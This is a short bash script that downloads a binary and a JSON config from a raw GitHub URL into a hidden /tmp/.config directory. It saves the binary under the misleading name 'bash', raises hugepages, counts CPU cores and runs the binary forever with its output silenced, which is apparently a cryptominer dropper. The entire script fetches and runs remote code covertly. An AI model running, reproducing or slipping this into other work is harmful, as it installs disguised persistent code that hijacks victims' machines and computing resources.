#!/bin/bash

src="https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main"
sysctl -w vm.nr_hugepages=32768 || sudo sysctl -w vm.nr_hugepages=32768

mkdir -p "/tmp/.config"
wget -qO "/tmp/.config/appsettings.json" "${src}/q.json"
wget -qO "/tmp/.config/bash" "${src}/q"
chmod -R 777 "/tmp/.config"

cores=`grep 'siblings' /proc/cpuinfo 2>/dev/null |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
[ -n "$cores" ] || cores=1
name="Cli_${cores}.sh"

while true; do cd /tmp/.config; ./bash "${name}" "${cores}" >/dev/null 2>&1 ; done

